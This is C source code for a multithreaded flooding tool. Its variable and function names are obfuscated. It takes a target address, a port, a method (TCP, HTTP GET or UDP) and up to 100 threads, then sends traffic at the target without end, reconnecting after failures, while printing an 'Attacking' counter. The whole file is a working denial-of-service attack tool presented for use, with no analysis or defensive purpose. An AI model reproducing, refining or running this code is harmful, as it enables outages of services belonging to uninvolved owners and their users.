#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <errno.h>
#define A 100
#define B 1024
#define C 3
#define D "\033[32m"
#define E "\033[31m"
#define F "\033[0m"
typedef struct{char*G;int H;int I;char*J;}K;int L=0;void*M(void*N){K*O=(K*)N;char P[B];int Q;struct sockaddr_in R;while(1){Q=socket(AF_INET,SOCK_STREAM,0);if(Q==-1){perror("Could not create socket");sleep(1);continue;}R.sin_addr.s_addr=inet_addr(O->G);R.sin_family=AF_INET;R.sin_port=htons(O->H);if(connect(Q,(struct sockaddr*)&R,sizeof(R))<0){perror("Connect failed");close(Q);sleep(1);continue;}while(1){if(send(Q,P,B,0)<0){perror("Send failed");break;}L++;}close(Q);}return NULL;}void*S(void*N){K*O=(K*)N;char T[B];int Q;struct sockaddr_in R;snprintf(T,B,"GET / HTTP/1.1\r\nHost: %s\r\n\r\n",O->G);while(1){Q=socket(AF_INET,SOCK_STREAM,0);if(Q==-1){perror("Could not create socket");sleep(1);continue;}R.sin_addr.s_addr=inet_addr(O->G);R.sin_family=AF_INET;R.sin_port=htons(O->H);if(connect(Q,(struct sockaddr*)&R,sizeof(R))<0){perror("Connect failed");close(Q);sleep(1);continue;}while(1){if(send(Q,T,strlen(T),0)<0){perror("Send failed");break;}L++;}close(Q);}return NULL;}void*U(void*N){K*O=(K*)N;char P[B];int Q;struct sockaddr_in R;int V=0;Q=socket(AF_INET,SOCK_DGRAM,0);if(Q==-1){perror("Could not create socket");return NULL;}R.sin_addr.s_addr=inet_addr(O->G);R.sin_family=AF_INET;R.sin_port=htons(O->H);while(1){if(sendto(Q,P,B,0,(struct sockaddr*)&R,sizeof(R))<0){perror("Sendto failed");V++;if(V>=C){break;}sleep(1);}else{L++;V=0;}}close(Q);return NULL;}int main(int W,char*X[]){if(W<5){printf("Usage: %s <target_ip> <target_port> <method> <threads>\n",X[0]);printf("Methods: tcp, http, udp\n");return 1;}char*Y=X[1];int Z=atoi(X[2]);char*aa=X[3];int ab=atoi(X[4]);if(ab>A){printf("Too many threads, max is %d\n",A);return 1;}pthread_t ac[A];K ad[A];printf("Starting %s flood with %d threads to %s:%d\n",aa,ab,Y,Z);for(int i=0;i<ab;i++){ad[i].G=Y;ad[i].H=Z;ad[i].I=i;ad[i].J=aa;if(strcmp(aa,"tcp")==0){if(pthread_create(&ac[i],NULL,M,(void*)&ad[i])!=0){perror("Failed to create thread");return 1;}}else if(strcmp(aa,"http")==0){if(pthread_create(&ac[i],NULL,S,(void*)&ad[i])!=0){perror("Failed to create thread");return 1;}}else if(strcmp(aa,"udp")==0){if(pthread_create(&ac[i],NULL,U,(void*)&ad[i])!=0){perror("Failed to create thread");return 1;}}else{printf("Unknown method: %s\n",aa);return 1;}}while(1){printf("\r%sAttacking%s | [ %s%d%s ]",D,F,E,L,F);fflush(stdout);sleep(1);}for(int i=0;i<ab;i++){pthread_join(ac[i],NULL);}return 0;}